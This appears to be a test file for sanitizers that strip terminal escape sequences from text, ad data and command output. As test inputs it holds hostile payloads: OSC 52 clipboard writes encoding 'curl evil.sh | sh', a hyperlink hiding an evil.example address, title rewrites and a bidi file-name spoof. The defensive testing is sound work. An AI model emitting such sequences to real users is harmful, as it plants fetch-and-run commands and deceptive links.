import { describe, expect, test } from 'bun:test'

import {
  sanitizeTerminalOutput,
  sanitizeTerminalStrings,
  sanitizeTerminalText,
} from '../terminal-safe-text'

const ESC = '\x1b'
const BEL = '\x07'
const ST = `${ESC}\\`

describe('sanitizeTerminalText', () => {
  test('removes an OSC 52 clipboard write, BEL- or ST-terminated', () => {
    expect(
      sanitizeTerminalText(
        `Buy now${ESC}]52;c;Y3VybCBldmlsLnNoIHwgc2g=${BEL}!`,
      ),
    ).toBe('Buy now!')
    expect(sanitizeTerminalText(`a${ESC}]52;c;ZWNobyBoaQ==${ST}b`)).toBe('ab')
    // 8-bit OSC introducer and ST
    expect(sanitizeTerminalText('a\x9d52;c;eA==\x9cb')).toBe('ab')
  })

  test('removes an OSC 8 hyperlink, keeping only the visible text', () => {
    expect(
      sanitizeTerminalText(
        `${ESC}]8;;https://evil.example/${ST}codebuff.com${ESC}]8;;${ST}`,
      ),
    ).toBe('codebuff.com')
  })

  test('removes cursor movement, screen clears and colour (CSI)', () => {
    expect(
      sanitizeTerminalText(`${ESC}[2J${ESC}[H${ESC}[31mRed${ESC}[0m`),
    ).toBe('Red')
    expect(sanitizeTerminalText(`a${ESC}[10;20Hb\x9b1Ac`)).toBe('abc')
    expect(sanitizeTerminalText(`x${ESC}[?1049hy`)).toBe('xy')
  })

  test('removes window-title, DCS/APC/PM and short ESC sequences', () => {
    expect(sanitizeTerminalText(`${ESC}]0;pwned${BEL}ok`)).toBe('ok')
    expect(sanitizeTerminalText(`${ESC}Pq#0;2;0;0;0${ST}ok`)).toBe('ok')
    expect(sanitizeTerminalText(`${ESC}_payload${ST}ok`)).toBe('ok')
    expect(sanitizeTerminalText(`a${ESC}7b${ESC}8c${ESC}cd`)).toBe('abcd')
    expect(sanitizeTerminalText(`dangling${ESC}`)).toBe('dangling')
  })

  test('removes C0/C1 controls and bidi/invisible formatting', () => {
    expect(sanitizeTerminalText('a\x00b\x08c\x7fd\x85e')).toBe('abcde')
    expect(sanitizeTerminalText('safe‮txt.exe')).toBe('safetxt.exe')
    expect(sanitizeTerminalText('zero​width')).toBe('zerowidth')
  })

  test('keeps printable text, newlines and indentation; normalizes CR and tabs', () => {
    expect(sanitizeTerminalText('  line one\r\nline two\rthree\n')).toBe(
      '  line one\nline two\nthree\n',
    )
    expect(sanitizeTerminalText('a\tb')).toBe('a  b')
    expect(sanitizeTerminalText('Ünïcödé — 漢字 🚀')).toBe('Ünïcödé — 漢字 🚀')
  })
})

describe('sanitizeTerminalStrings', () => {
  test('cleans every string in a nested document and keeps its shape', () => {
    const input = {
      ads: [
        {
          title: `Deal${ESC}]52;c;eA==${BEL}`,
          bullets: [`one${ESC}[2K`, 'two'],
          clickUrl: 'https://codebuff.com/c?x=1',
          priority: 3,
          flag: true,
          missing: null,
        },
      ],
      provider: 'first_party',
    }
    expect(sanitizeTerminalStrings(input)).toEqual({
      ads: [
        {
          title: 'Deal',
          bullets: ['one', 'two'],
          clickUrl: 'https://codebuff.com/c?x=1',
          priority: 3,
          flag: true,
          missing: null,
        },
      ],
      provider: 'first_party',
    })
    // The input is not mutated.
    expect(input.ads[0]!.title).toContain(ESC)
  })

  test('passes primitives and non-plain objects through', () => {
    expect(sanitizeTerminalStrings(5)).toBe(5)
    expect(sanitizeTerminalStrings(undefined)).toBeUndefined()
    const date = new Date(0)
    expect(sanitizeTerminalStrings(date)).toBe(date)
    expect(sanitizeTerminalStrings(`${ESC}[1mx`)).toBe('x')
  })
})

describe('sanitizeTerminalOutput', () => {
  test('strips a clipboard write printed by a command, keeping the text', () => {
    const printed = `PASS 3 tests\n${ESC}]52;c;Y3VybCBldmlsLnNoIHwgc2g=${BEL}${ESC}]0;owned${ST}done\n`
    expect(sanitizeTerminalOutput(printed)).toBe('PASS 3 tests\ndone\n')
  })

  test('keeps only the final redraw of a carriage-return progress bar', () => {
    expect(sanitizeTerminalOutput('start\n 10%\r 50%\r100%\nend')).toBe(
      'start\n100%\nend',
    )
  })

  test('treats CRLF as a line break, not a redraw', () => {
    expect(sanitizeTerminalOutput('a\r\nb\r\n')).toBe('a\nb\n')
  })

  test('leaves plain output and indentation unchanged', () => {
    const tree = 'src\n  index.ts\n  util/\n    a.ts'
    expect(sanitizeTerminalOutput(tree)).toBe(tree)
    expect(sanitizeTerminalOutput('')).toBe('')
  })
})
